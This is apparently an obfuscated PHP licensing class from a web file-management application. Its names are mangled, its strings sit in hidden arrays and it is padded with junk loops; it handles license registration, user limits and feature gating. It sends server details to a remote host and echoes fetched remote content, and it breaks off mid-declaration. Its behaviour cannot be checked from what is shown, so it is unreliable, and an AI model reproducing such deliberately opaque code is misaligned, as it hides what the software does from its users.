$GLOBALS[$ÒõëáÔ¨[13]][$ÒõëáÔ¨[15]] = implode($ÒõëáÔ¨[0], $GLOBALS[$ÒõëáÔ¨[13]][$ÒõëáÔ¨[14]]); $ãÚ›—µ™ = $¡ö¶øÅõ[633]; while ($ãÚ›—µ™ < $¡ö¶øÅõ[620]) { if ($ãÚ›—µ™ >= 0) { break; } $ãÚ›—µ™++; } } public function run() { $£äú„«Î =& $_SERVER[ßğøİ]; $„ü²Ù‹² =& $_SERVER[©·å†­”]; $this->gkqm5d53be7b(); $Œ­—™¢ı = $£äú„«Î[634]; if (!$Œ­—™¢ı) { die; } $this->wzdu3a790c19(); $’ûÒ¦Üè = $£äú„«Î[635]; $ãÄâ‡¿¾ = $GLOBALS[$„ü²Ù‹²[13]][$„ü²Ù‹²[14]]; $®ò„®× = $GLOBALS[$„ü²Ù‹²[13]][$„ü²Ù‹²[15]]; define($„ü²Ù‹²[20], isset($ãÄâ‡¿¾[0]) && $ãÄâ‡¿¾[0] ? $ãÄâ‡¿¾[0] : $this->defaultModule); define($„ü²Ù‹²[21], isset($ãÄâ‡¿¾[1]) && $ãÄâ‡¿¾[0] ? $ãÄâ‡¿¾[1] : $this->defaultController); define($„ü²Ù‹²[22], isset($ãÄâ‡¿¾[2]) && $ãÄâ‡¿¾[0] ? $ãÄâ‡¿¾[2] : $this->defaultAction); $Âò‰ÁŠÑ = $£äú„«Î[636]; if (!$Âò‰ÁŠÑ) { return; } define($„ü²Ù‹²[23], MOD . $„ü²Ù‹²[0] . ST . $„ü²Ù‹²[0] . ACT); $_SERVER[$„ü²Ù‹²[24]] = strtolower(ACTION); $ÉËÙ¶ë = $£äú„«Î[637]; while (strlen($ÉËÙ¶ë) < $£äú„«Î[620]) { if (!$ÉËÙ¶ë) { break; } $ÉËÙ¶ë++; } $this->autorun(); if (count($ãÄâ‡¿¾) >= 3) { $this->appRun($®ò„®×); } else { $this->appRun(ACTION); } } private $sgcy8d8cca76 = array(); private $cmeh85c6e523 = ''; public function bdiz94b511f2() { $•÷ş–ªİ =& $_SERVER[ßğøİ]; $”Š¯Úâü =& $_SERVER[©·å†­”]; $this->jocfd97350cd(); $ŸÎ¡­û£ = $•÷ş–ªİ[638]; if (!$ŸÎ¡­û£) { die; } $this->qncz1927fc5d(); $¡ÒÓàó = $•÷ş–ªİ[639]; while ($¡ÒÓàó < $•÷ş–ªİ[615]) { if ($¡ÒÓàó >= 0) { break; } $¡ÒÓàó++; } $this->dmft63ba4bc8(); $this->asjx63b9651c(); $this->qjhfa809c9c3(); $this->lgsb93f56fe2(); $›ªš–µ = $•÷ş–ªİ[640]; $this->pqfm40ba3075(); $Ÿêà”÷¶ = $•÷ş–ªİ[641]; $this->sgzb3b30794e($”Š¯Úâü[25], array($this, $”Š¯Úâü[26])); $this->sgzb3b30794e($”Š¯Úâü[27], array($this, $”Š¯Úâü[28])); $this->sgzb3b30794e($”Š¯Úâü[29], array($this, $”Š¯Úâü[30])); $this->sgzb3b30794e($”Š¯Úâü[31], array($this, $”Š¯Úâü[32])); } public function vsbr48741485($ôÁÑí¾ô) { $‚À¸É™¿ =& $_SERVER[ßğøİ]; $ ¹²ìÇÊ =& $_SERVER[©·å†­”]; $½ëÚ‚´Î = Model($ ¹²ìÇÊ[33])->get(); $­¦óş¿× = $‚À¸É™¿[642]; $‘†¹¿”‘ = array($ ¹²ìÇÊ[34], $ ¹²ìÇÊ[35], $ ¹²ìÇÊ[36], $ ¹²ìÇÊ[37], $ ¹²ìÇÊ[38], $ ¹²ìÇÊ[39], $ ¹²ìÇÊ[40], $ ¹²ìÇÊ[41], $ ¹²ìÇÊ[42], $ ¹²ìÇÊ[43], $ ¹²ìÇÊ[44], $ ¹²ìÇÊ[45], $ ¹²ìÇÊ[46], $ ¹²ìÇÊ[47], $ ¹²ìÇÊ[48], $ ¹²ìÇÊ[49], $ ¹²ìÇÊ[50], $ ¹²ìÇÊ[51], $ ¹²ìÇÊ[52], $ ¹²ìÇÊ[53], $ ¹²ìÇÊ[54], $ ¹²ìÇÊ[55], $ ¹²ìÇÊ[56], $ ¹²ìÇÊ[57], $ ¹²ìÇÊ[58], $ ¹²ìÇÊ[59], $ ¹²ìÇÊ[60], $ ¹²ìÇÊ[61], $ ¹²ìÇÊ[62], $ ¹²ìÇÊ[63], $ ¹²ìÇÊ[64], $ ¹²ìÇÊ[65], $ ¹²ìÇÊ[66], $ ¹²ìÇÊ[67], $ ¹²ìÇÊ[68], $ ¹²ìÇÊ[69], $ ¹²ìÇÊ[70], $ ¹²ìÇÊ[71], $ ¹²ìÇÊ[72], $ ¹²ìÇÊ[73], $ ¹²ìÇÊ[74], $ ¹²ìÇÊ[75], $ ¹²ìÇÊ[76], $ ¹²ìÇÊ[77], $ ¹²ìÇÊ[78], $ ¹²ìÇÊ[79], $ ¹²ìÇÊ[80], $ ¹²ìÇÊ[81], $ ¹²ìÇÊ[82], $ ¹²ìÇÊ[83]); foreach ($‘†¹¿”‘ as $ÈÁæ§Éª) { $º»ıüæ = $GLOBALS[$ ¹²ìÇÊ[84]][$ ¹²ìÇÊ[85]][$ÈÁæ§Éª]; if (isset($½ëÚ‚´Î[$ÈÁæ§Éª])) { $º»ıüæ = $½ëÚ‚´Î[$ÈÁæ§Éª]; } $ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[87]][$ÈÁæ§Éª] = $º»ıüæ; } $ÛÚ”…»† = $ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[87]][$ ¹²ìÇÊ[46]]; $•¾±— = $‚À¸É™¿[643]; if (strlen($•¾±—) < $‚À¸É™¿[615]) { die; } unset($ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[88]][$ ¹²ìÇÊ[89]]); unset($ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[88]][$ ¹²ìÇÊ[90]]); unset($ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[87]][$ ¹²ìÇÊ[46]]); $‚Õıš× = $‚À¸É™¿[644]; while ($‚Õıš× < $‚À¸É™¿[615]) { if ($‚Õıš× >= 0) { break; } $‚Õıš×++; } unset($ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[87]][$ ¹²ìÇÊ[91]]); $ï±×§İÜ = $‚À¸É™¿[645]; $ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[87]][$ ¹²ìÇÊ[92]] = array($ ¹²ìÇÊ[93] => (int) $ÛÚ”…»†[$ ¹²ìÇÊ[94]], $ ¹²ìÇÊ[95] => (int) _get($ÛÚ”…»†, $ ¹²ìÇÊ[96], 0)); $¶àæ…”’ = $‚À¸É™¿[646]; if (!$¶àæ…”’) { die; } $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[98]] = Action($ ¹²ìÇÊ[99])->accessToken(); $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[100]] = md5($_SERVER[$ ¹²ìÇÊ[101]] . $½ëÚ‚´Î[$ ¹²ìÇÊ[102]]); $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[103]] = base64_encode(serverInfo()); $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[104]] = $this->cmeh85c6e523; $Û­ØŠÅ• = $‚À¸É™¿[647]; if ($½ëÚ‚´Î[$ ¹²ìÇÊ[104]] != $ ¹²ìÇÊ[105]) { $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[106]] = $½ëÚ‚´Î[$ ¹²ìÇÊ[106]]; $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[107]] = $½ëÚ‚´Î[$ ¹²ìÇÊ[107]]; $¸Š§®šÁ = rand_string(10) . $this->cmeh85c6e523 . rand_string(5); $ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[108]][$ ¹²ìÇÊ[109]] = $this->eroh9a69de71($¸Š§®šÁ, $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[100]]); } if ($this->cmeh85c6e523 == $ ¹²ìÇÊ[105]) { $ôÁÑí¾ô[$ ¹²ìÇÊ[86]][$ ¹²ìÇÊ[87]][$ ¹²ìÇÊ[92]][$ ¹²ìÇÊ[96]] = 0; } $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[110]] = _get($this->sgcy8d8cca76, $ ¹²ìÇÊ[111], $ ¹²ìÇÊ[6]); $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[112]] = _get($this->sgcy8d8cca76, $ ¹²ìÇÊ[113], $ ¹²ìÇÊ[6]); if (_get($GLOBALS, $ ¹²ìÇÊ[114]) && $this->config[$ ¹²ìÇÊ[115]]) { $ôÁÑí¾ô[$ ¹²ìÇÊ[97]][$ ¹²ìÇÊ[116]] = WEB_ROOT; } return $ôÁÑí¾ô; } private function lgsb93f56fe2() { $ğêë’×Œ =& $_SERVER[©·å†­”]; $›‘ÀÃµ½ = $_SERVER[$ğêë’×Œ[24]] == $ğêë’×Œ[117]; if ($_SERVER[$ğêë’×Œ[24]] == $ğêë’×Œ[118] && $_GET[$ğêë’×Œ[119]] == $ğêë’×Œ[120]) { $›‘ÀÃµ½ = !0; } if ($›‘ÀÃµ½) { $ª¯ù†Â = array($ğêë’×Œ[104] => $this->cmeh85c6e523, $ğêë’×Œ[121] => $this->whkb0829dcf7(), $ğêë’×Œ[122] => Model($ğêë’×Œ[123])->count()); if ($this->cmeh85c6e523 != $ğêë’×Œ[105]) { $ªó”ıÒ = _get($this->sgcy8d8cca76, $ğêë’×Œ[124]); if ($ªó”ıÒ) { $ª¯ù†Â[$ğêë’×Œ[125]] = $ªó”ıÒ; $ª¯ù†Â[$ğêë’×Œ[126]] = strtotime(_get($this->sgcy8d8cca76, $ğêë’×Œ[127])); $ª¯ù†Â[$ğêë’×Œ[128]] = _get($this->sgcy8d8cca76, $ğêë’×Œ[113]); } $¦”Á•àÍ = Model($ğêë’×Œ[33])->get($ğêë’×Œ[129], $ğêë’×Œ[6], !0); if (is_string($¦”Á•àÍ) && substr($¦”Á•àÍ, 0, 1) == $ğêë’×Œ[130]) { $¦”Á•àÍ = json_decode_force($¦”Á•àÍ); } if (is_array($¦”Á•àÍ) && $¦”Á•àÍ[$ğêë’×Œ[131]] && strstr($¦”Á•àÍ[$ğêë’×Œ[131]], $ğêë’×Œ[132])) { $¤ï‘²œ€ = explode($ğêë’×Œ[132], $¦”Á•àÍ[$ğêë’×Œ[131]]); $ª¯ù†Â[$ğêë’×Œ[133]] = $¤ï‘²œ€[0]; } } $ª¯ù†Â = $this->ljdaedd3de6e(json_encode($ª¯ù†Â), md5($ğêë’×Œ[134])); $àÕÑ÷£ø = array($ğêë’×Œ[135] => $ª¯ù†Â); call_user_func(array($ğêë’×Œ[136], $ğêë’×Œ[137]), $àÕÑ÷£ø); } if ($this->cmeh85c6e523 == $ğêë’×Œ[105]) { return; } $˜˜èæÙ = array($ğêë’×Œ[138], $ğêë’×Œ[139], $ğêë’×Œ[140], $ğêë’×Œ[141], $ğêë’×Œ[142], $ğêë’×Œ[143]); $óÓıÁ¤ = Model($ğêë’×Œ[33])->get(); $àÕÑ÷£ø = array($ğêë’×Œ[144] => $óÓıÁ¤[$ğêë’×Œ[34]], $ğêë’×Œ[145] => $óÓıÁ¤[$ğêë’×Œ[35]], $ğêë’×Œ[146] => $ğêë’×Œ[6]); $ŞñÉŸä = $_SERVER[ßğøİ][648]; foreach ($˜˜èæÙ as $´ûÌ®Ì) { if (!isset($óÓıÁ¤[$´ûÌ®Ì]) || !$óÓıÁ¤[$´ûÌ®Ì]) { continue; } $àÕÑ÷£ø[$´ûÌ®Ì] = $óÓıÁ¤[$´ûÌ®Ì]; } call_user_func(array($ğêë’×Œ[136], $ğêë’×Œ[137]), $àÕÑ÷£ø); } private function asjx63b9651c() { $Ûº–˜è‡ =& $_SERVER[ßğøİ]; $‰›Â =& $_SERVER[©·å†­”]; if ($_SERVER[$‰›Â[24]] != $‰›Â[147]) { return; } if (!_get($GLOBALS, $‰›Â[114])) { die; } $ÌÆ¼Æ…Ò = $GLOBALS[$‰›Â[13]]; if (isset($ÌÆ¼Æ…Ò[$‰›Â[148]])) { $this->zgaw19a107d3(); die; } if (!isset($ÌÆ¼Æ…Ò[$‰›Â[149]]) || strlen($ÌÆ¼Æ…Ò[$‰›Â[149]]) != 16) { show_json($‰›Â[150] . $ÌÆ¼Æ…Ò[$‰›Â[149]], !1); } $æ¡—µáÍ = Model($‰›Â[33])->get($‰›Â[102]); $Ë…Š»ÆÃ = md5($_SERVER[$‰›Â[101]] . $æ¡—µáÍ); $ì¢°Êƒø = $Ûº–˜è‡[649]; if (!$ì¢°Êƒø) { die; } $·³Ñş€¥ = array($‰›Â[149] => $ÌÆ¼Æ…Ò[$‰›Â[149]], $‰›Â[151] => rand_string(16), $‰›Â[152] => $‰›Â[134], $‰›Â[153] => $‰›Â[154], $‰›Â[155] => $_SERVER[$‰›Â[156]], $‰›Â[157] => $_SERVER[$‰›Â[158]], $‰›Â[159] => $_SERVER[$‰›Â[160]], $‰›Â[100] => $Ë…Š»ÆÃ, $‰›Â[161] => Model($‰›Â[33])->get($‰›Â[129])); if ($ÌÆ¼Æ…Ò[$‰›Â[162]] == $‰›Â[163]) { $æ‡ëµëË = $this->ljdaedd3de6e($Ë…Š»ÆÃ, $‰›Â[164]); $ÍÅÑŒ‹÷ = $this->eroh9a69de71(json_encode($·³Ñş€¥), $Ë…Š»ÆÃ . $‰›Â[165], 3); $ÍÅÑŒ‹÷ = $ÍÅÑŒ‹÷ . $‰›Â[166] . $_SERVER[$‰›Â[156]]; $Àš¡å½Î = $this->cotn77310b51($‰›Â[167] . $æ‡ëµëË . $‰›Â[168] . $ÍÅÑŒ‹÷, -1); show_json($Àš¡å½Î, !0); } else { if ($ÌÆ¼Æ…Ò[$‰›Â[162]] == $‰›Â[169]) { $úÂèê÷ = substr(md5($‰›Â[170] . $Ë…Š»ÆÃ), 12, 15) . $‰›Â[171]; $ÍÅÑŒ‹÷ = $this->jmxkb7c06d81(trim($ÌÆ¼Æ…Ò[$‰›Â[172]]), $úÂèê÷, 2); $ÊÑ„€ôØ = json_decode($ÍÅÑŒ‹÷, !0); if (!is_array($ÊÑ„€ôØ) || !is_array($ÊÑ„€ôØ[$‰›Â[173]]) || $ÊÑ„€ôØ[$‰›Â[149]] != !0) { $Éá²ÀÙ = $‰›Â[174]; $·¡Ü°ıÚ = $ÊÑ„€ôØ[$‰›Â[173]] ? $‰›Â[175] . $ÊÑ„€ôØ[$‰›Â[173]] : $Éá²ÀÙ; show_json($·¡Ü°ıÚ, !1); } else { $·³Ñş€¥[$‰›Â[151]] = $ÊÑ„€ôØ[$‰›Â[173]][$‰›Â[176]]; } } else { $ÊÑ„€ôØ = $this->cotn77310b51($‰›Â[177], $·³Ñş€¥, 10); $…µ¨²¢¯ = $Ûº–˜è‡[650]; while ($…µ¨²¢¯ < $Ûº–˜è‡[624]) { if ($…µ¨²¢¯ >= 0) { break; } $…µ¨²¢¯++; } } } if (!is_array($ÊÑ„€ôØ) || !is_array($ÊÑ„€ôØ[$‰›Â[173]]) || $ÊÑ„€ôØ[$‰›Â[149]] != !0) { $Éá²ÀÙ = LNG($‰›Â[178]); $·¡Ü°ıÚ = $ÊÑ„€ôØ[$‰›Â[173]] ? $‰›Â[175] . $ÊÑ„€ôØ[$‰›Â[173]] : $Éá²ÀÙ; show_json($·¡Ü°ıÚ, !1); } $¤ßöü„€ = $ÊÑ„€ôØ[$‰›Â[173]]; $æÑ½€ ´ = $this->qbhd02d73e0c($¤ßöü„€[$‰›Â[179]]); $®Õ­µ¨í = $Ûº–˜è‡[651]; while (strlen($®Õ­µ¨í) < $Ûº–˜è‡[615]) { if (!$®Õ­µ¨í) { break; } $®Õ­µ¨í++; } if (!$æÑ½€ ´ || $æÑ½€ ´ != $¤ßöü„€[$‰›Â[127]]) { $—ã„à‹Õ = array($‰›Â[180] => Model($‰›Â[33])->get($‰›Â[102]), $‰›Â[181] => $_SERVER[$‰›Â[101]], $‰›Â[182] => this_url(), $‰›Â[157] => $_SERVER[$‰›Â[158]]); $ÍÅÑŒ‹÷ = $this->cwua9424ead5(json_encode($—ã„à‹Õ)); $this->cotn77310b51($‰›Â[183] . $ÍÅÑŒ‹÷); show_json(LNG($‰›Â[184]), !0); } $…½‘åèÍ = array($‰›Â[185] => $¤ßöü„€[$‰›Â[186]], $‰›Â[187] => $¤ßöü„€[$‰›Â[188]], $‰›Â[189] => rand_string(16), $‰›Â[104] => $¤ßöü„€[$‰›Â[190]]); if ($·³Ñş€¥[$‰›Â[151]]) { $…½‘åèÍ[$‰›Â[189]] = $·³Ñş€¥[$‰›Â[151]]; } $ÜÅ©õê = substr(md5($…½‘åèÍ[$‰›Â[187]]), 10, 10); $‡ Èş©¨ = $ÜÅ©õê . $…½‘åèÍ[$‰›Â[104]] . $…½‘åèÍ[$‰›Â[189]]; $—òÏÌñã = $Ûº–˜è‡[652]; $…½‘åèÍ[$‰›Â[106]] = strrev(base64_encode($this->ljdaedd3de6e($‡ Èş©¨, $‰›Â[191]))); $Ÿ¾æÈØÙ = rand_string(16); $ïêæÙ®È = $Ûº–˜è‡[653]; while (strlen($ïêæÙ®È) < $Ûº–˜è‡[620]) { if (!$ïêæÙ®È) { break; } $ïêæÙ®È++; } $¹ª™·Şï = $Ÿ¾æÈØÙ . $…½‘åèÍ[$‰›Â[104]] . $this->ljdaedd3de6e(md5($…½‘åèÍ[$‰›Â[185]]), $Ÿ¾æÈØÙ); $ã§ªŞÄß = $Ûº–˜è‡[654]; while ($ã§ªŞÄß < $Ûº–˜è‡[620]) { if ($ã§ªŞÄß >= 0) { break; } $ã§ªŞÄß++; } $…½‘åèÍ[$‰›Â[107]] = base64_encode(strrev($this->ljdaedd3de6e($¹ª™·Şï, $‰›Â[192]))); $ÔÇãƒ¤ = $Ûº–˜è‡[655]; if (!$ÔÇãƒ¤) { die; } if ($¤ßöü„€[$‰›Â[193]] && $¤ßöü„€[$‰›Â[193]] >= 1) { Model($‰›Â[33])->setDeep($‰›Â[194], $‰›Â[120]); } Model($‰›Â[33])->set($…½‘åèÍ); $İàÌ€§® = md5($_SERVER[$‰›Â[101]] . strrev($æ¡—µáÍ) . $…½‘åèÍ[$‰›Â[187]]); $‡Ñàæ¢å = $Ûº–˜è‡[656]; if (strlen($‡Ñàæ¢å) < $Ûº–˜è‡[615]) { die; } $·ÁŒÓÏË = strrev(substr($İàÌ€§®, 10, 16)); $’ä¬ÚµÎ = $Ûº–˜è‡[657]; $£îöâÃò = $this->eroh9a69de71(json_encode($¤ßöü„€), $İàÌ€§®); $ÖŞ±é–Ç = array_to_keyvalue(Model($‰›Â[7])->listData(), $‰›Â[195]); $¬«­ùÑŸ = $ÖŞ±é–Ç[$‰›Â[196]]; $©ó‚Ô‡› = array(); $¤µ¶æ­Ÿ = $Ûº–˜è‡[658]; $©ó‚Ô‡›[$·ÁŒÓÏË] = $£îöâÃò; $¾ ±²„Ó = $Ûº–˜è‡[659]; if (strlen($¾ ±²„Ó) < $Ûº–˜è‡[660]) { return; } Model($‰›Â[7])->update($¬«­ùÑŸ[$‰›Â[197]], array($‰›Â[198] => $©ó‚Ô‡›)); $û¿È‹¨ê = $Ûº–˜è‡[661]; while (strlen($û¿È‹¨ê) < $Ûº–˜è‡[620]) { if (!$û¿È‹¨ê) { break; } $û¿È‹¨ê++; } $this->sgcy8d8cca76 = $¤ßöü„€; $this->cmeh85c6e523 = $…½‘åèÍ[$‰›Â[104]]; $this->licenseRegistSuccess(); Cache::set($‰›Â[199] . md5($æ¡—µáÍ . $‰›Â[200]), $‰›Â[6]); $Îü Ï’ = $Ûº–˜è‡[662]; if (strlen($Îü Ï’) < $Ûº–˜è‡[620]) { return; } show_json(LNG($‰›Â[184]), !0); $ø—øÛ´¹ = $Ûº–˜è‡[663]; } private function licenseRegistSuccess() { $ª· ”óÅ =& $_SERVER[ßğøİ]; $üàøÌ—£ =& $_SERVER[©·å†­”]; $¶â£ƒª = Model($üàøÌ—£[33])->get(); $„»Û¯æ— = $ª· ”óÅ[664]; if (strlen($„»Û¯æ—) < $ª· ”óÅ[620]) { return; } if ($¶â£ƒª[$üàøÌ—£[63]] != $üàøÌ—£[120]) { Model($üàøÌ—£[33])->set($üàøÌ—£[63], $üàøÌ—£[120]); } Action($üàøÌ—£[201])->initStart(!0); } private function zgaw19a107d3() { $¥¢Üö† =& $_SERVER[ßğøİ]; $÷‹‹ÛÍÓ =& $_SERVER[©·å†­”]; Model($÷‹‹ÛÍÓ[33])->set(array($÷‹‹ÛÍÓ[185] => $÷‹‹ÛÍÓ[6], $÷‹‹ÛÍÓ[187] => $÷‹‹ÛÍÓ[6], $÷‹‹ÛÍÓ[104] => $÷‹‹ÛÍÓ[105], $÷‹‹ÛÍÓ[106] => $÷‹‹ÛÍÓ[6], $÷‹‹ÛÍÓ[107] => $÷‹‹ÛÍÓ[6])); Model($÷‹‹ÛÍÓ[33])->setDeep($÷‹‹ÛÍÓ[194], $÷‹‹ÛÍÓ[202]); $this->sgcy8d8cca76 = array(); $ŞØ»¿“ô = $¥¢Üö†[665]; if (strlen($ŞØ»¿“ô) < $¥¢Üö†[660]) { die; } $this->cmeh85c6e523 = $÷‹‹ÛÍÓ[105]; $Çé¥”ñÕ = $¥¢Üö†[666]; } private function jocfd97350cd() { $€”ôÊÂ =& $_SERVER[ßğøİ]; $ñÚ€ò«Ã =& $_SERVER[©·å†­”]; $_SERVER[$ñÚ€ò«Ã[158]] = _get($_SERVER, $ñÚ€ò«Ã[158], APP_HOST); $–‚ñ¦üÄ = $€”ôÊÂ[667]; if (!$–‚ñ¦üÄ) { die; } $this->cmeh85c6e523 = $ñÚ€ò«Ã[105]; $—•„„Òæ = Model($ñÚ€ò«Ã[33])->get(); if ($—•„„Òæ[$ñÚ€ò«Ã[104]] == $ñÚ€ò«Ã[105]) { return; } $‡é†ÎçÅ = Model($ñÚ€ò«Ã[33])->get($ñÚ€ò«Ã[102]); $å³å¸¢¶ = $ñÚ€ò«Ã[199] . md5($‡é†ÎçÅ . $ñÚ€ò«Ã[200]); $•ŠÎÈÕù = $€”ôÊÂ[668]; if (strlen($•ŠÎÈÕù) < $€”ôÊÂ[620]) { die; } $¦À÷Ë­Œ = Cache::get($å³å¸¢¶); if (!is_array($¦À÷Ë­Œ) || !isset($¦À÷Ë­Œ[$ñÚ€ò«Ã[203]]) || time() - $¦À÷Ë­Œ[$ñÚ€ò«Ã[203]] >= 60) { $’›ºÌ°¿ = Model($ñÚ€ò«Ã[7])->loadList(); $¥€¥Æ«œ = $’›ºÌ°¿[$ñÚ€ò«Ã[196]]; $ñçŸÁé› = md5($_SERVER[$ñÚ€ò«Ã[101]] . strrev($‡é†ÎçÅ) . $—•„„Òæ[$ñÚ€ò«Ã[187]]); $‰û§®² = strrev(substr($ñçŸÁé›, 10, 16)); $¦À÷Ë­Œ = $this->jmxkb7c06d81($¥€¥Æ«œ[$ñÚ€ò«Ã[84]][$‰û§®²], $ñçŸÁé›); $¦À÷Ë­Œ = json_decode($¦À÷Ë­Œ, !0); } if (!is_array($¦À÷Ë­Œ)) { return $this->zgaw19a107d3(); } $ôÏ§íåÎ = strtotime($¦À÷Ë­Œ[$ñÚ€ò«Ã[127]]); if (time() >= $ôÏ§íåÎ) { return $this->zgaw19a107d3(); } if (time() - $¦À÷Ë­Œ[$ñÚ€ò«Ã[203]] > 20) { $¦À÷Ë­Œ[$ñÚ€ò«Ã[203]] = time(); Cache::set($å³å¸¢¶, $¦À÷Ë­Œ); } $this->sgcy8d8cca76 = $¦À÷Ë­Œ; $this->cmeh85c6e523 = $—•„„Òæ[$ñÚ€ò«Ã[104]]; $á÷á«Ş€ = $€”ôÊÂ[669]; if (!$á÷á«Ş€) { die; } } private function qncz1927fc5d() { $¤ÚäéÃÏ =& $_SERVER[ßğøİ]; $áÂ¯ÚÜ¢ =& $_SERVER[©·å†­”]; $˜¥×ûÎÓ = $GLOBALS[$áÂ¯ÚÜ¢[13]]; $ëüŠ•ÍŠ = $¤ÚäéÃÏ[670]; if (strlen($ëüŠ•ÍŠ) < $¤ÚäéÃÏ[660]) { die; } $ûÌƒğ† = $_SERVER[$áÂ¯ÚÜ¢[24]]; $­›¡ºäø = $¤ÚäéÃÏ[671]; if (!$­›¡ºäø) { return; } if ($ûÌƒğ† == $áÂ¯ÚÜ¢[204] && $this->cmeh85c6e523 == $áÂ¯ÚÜ¢[105]) { show_json(LNG($áÂ¯ÚÜ¢[205]), !1, $áÂ¯ÚÜ¢[206]); } $ªªê¥‚× = array($áÂ¯ÚÜ¢[207], $áÂ¯ÚÜ¢[208]); if (in_array($ûÌƒğ†, $ªªê¥‚×)) { if ($this->cmeh85c6e523 == $áÂ¯ÚÜ¢[105] && isset($˜¥×ûÎÓ[$áÂ¯ÚÜ¢[209]])) { show_json(LNG($áÂ¯ÚÜ¢[205]), !1, $áÂ¯ÚÜ¢[206]); die; } $±·¨ ğŞ = $this->whkb0829dcf7(); if ($±·¨ ğŞ != intval($áÂ¯ÚÜ¢[210])) { if ($±·¨ ğŞ <= Model($áÂ¯ÚÜ¢[123])->count()) { show_json(LNG($áÂ¯ÚÜ¢[211]), !1, $áÂ¯ÚÜ¢[206]); die; } } } } private function dmft63ba4bc8() { $ÁÒó¤®Î =& $_SERVER[ßğøİ]; $¨Èãì— =& $_SERVER[©·å†­”]; $³Å·€“Ú = array($¨Èãì—[117], $¨Èãì—[118]); $ôÅíû©µ = $ÁÒó¤®Î[672]; if (!_get($GLOBALS, $¨Èãì—[114]) || !isset($_GET[$¨Èãì—[212]])) { return; } if (!in_array($_SERVER[$¨Èãì—[24]], $³Å·€“Ú)) { return; } $ëúª˜·ë = $¨Èãì—[213]; $ÀîôéÒı = $ÁÒó¤®Î[673]; if (!$ÀîôéÒı) { return; } $ëúª˜·ë = $this->dybl1143cd62($ëúª˜·ë, $¨Èãì—[214]); $Ô×úñ«¼ = $ÁÒó¤®Î[674]; $Ôœ³Ìó = stream_context_create(array($¨Èãì—[215] => array($¨Èãì—[216] => $¨Èãì—[217], $¨Èãì—[218] => 3))); $Òî‰³Çü = $ÁÒó¤®Î[675]; $Ğ‡¼š¤Ñ = @file_get_contents($ëúª˜·ë, !1, $Ôœ³Ìó); header($¨Èãì—[219]); if ($Ğ‡¼š¤Ñ && strstr($Ğ‡¼š¤Ñ, $¨Èãì—[220])) { echo $Ğ‡¼š¤Ñ; } die; } public function rfnmbe7fb8b2($“ò¼ÆÛœ) { $øŸÙ² =& $_SERVER[ßğøİ]; $µØ®ÚÅ =& $_SERVER[©·å†­”]; if ($this->cmeh85c6e523 == $µØ®ÚÅ[221]) { return $“ò¼ÆÛœ; } $Àã„Ã·Ğ = array($µØ®ÚÅ[222] => $µØ®ÚÅ[223], $µØ®ÚÅ[224] => $µØ®ÚÅ[223], $µØ®ÚÅ[225] => $µØ®ÚÅ[223], $µØ®ÚÅ[226] => $µØ®ÚÅ[223], $µØ®ÚÅ[227] => $µØ®ÚÅ[228], $µØ®ÚÅ[229] => $µØ®ÚÅ[228], $µØ®ÚÅ[230] => $µØ®ÚÅ[228], $µØ®ÚÅ[231] => $µØ®ÚÅ[228], $µØ®ÚÅ[232] => $µØ®ÚÅ[228], $µØ®ÚÅ[233] => $µØ®ÚÅ[228], $µØ®ÚÅ[234] => $µØ®ÚÅ[228], $µØ®ÚÅ[235] => $µØ®ÚÅ[228], $µØ®ÚÅ[236] => $µØ®ÚÅ[228], $µØ®ÚÅ[237] => $µØ®ÚÅ[228], $µØ®ÚÅ[238] => $µØ®ÚÅ[228], $µØ®ÚÅ[239] => $µØ®ÚÅ[228]); $Û›Ëˆ¾ = explode($µØ®ÚÅ[240], _get($this->sgcy8d8cca76, $µØ®ÚÅ[111], $µØ®ÚÅ[6])); $»™Å° = $øŸÙ²[676]; if (!$»™Å°) { return; } $Ôõäşô = array(); $ÔÌùôÈï = $øŸÙ²[677]; if (!$ÔÌùôÈï) { die; } foreach ($Àã„Ã·Ğ as $¨¦›ı”Ì => $Æ¨ˆ¹Õ) { if ($Æ¨ˆ¹Õ == $µØ®ÚÅ[223] && substr($this->cmeh85c6e523, 0, 1) == $µØ®ÚÅ[223]) { continue; } if (!in_array($¨¦›ı”Ì, $Û›Ëˆ¾)) { $Ôõäşô[] = $¨¦›ı”Ì; } } foreach ($Ôõäşô as $¨¦›ı”Ì) { unset($“ò¼ÆÛœ[$¨¦›ı”Ì]); } return $“ò¼ÆÛœ; } private function pqfm40ba3075() { $ ´Åß˜× =& $_SERVER[©·å†­”]; if ($this->cmeh85c6e523 != $ ´Åß˜×[105]) { $GLOBALS[$ ´Åß˜×[84]][$ ´Åß˜×[88]][$ ´Åß˜×[241]] = $ ´Åß˜×[202]; return; } $GLOBALS[$ ´Åß˜×[84]][$ ´Åß˜×[242]] = $ ´Åß˜×[120]; if (Model($ ´Åß˜×[243])->get($ ´Åß˜×[63]) != $ ´Åß˜×[202]) { Model($ ´Åß˜×[243])->set($ ´Åß˜×[63], $ ´Åß˜×[202]); } } public function acbeae9b8bf3() { $ÕäÁÉƒó =& $_SERVER[ßğøİ]; return $_SERVER[©·å†­”][244]; $ÑªıÆç = $ÕäÁÉƒó[678]; while ($ÑªıÆç < $ÕäÁÉƒó[620]) { if ($ÑªıÆç >= 0) { break; } $ÑªıÆç++; } } private function 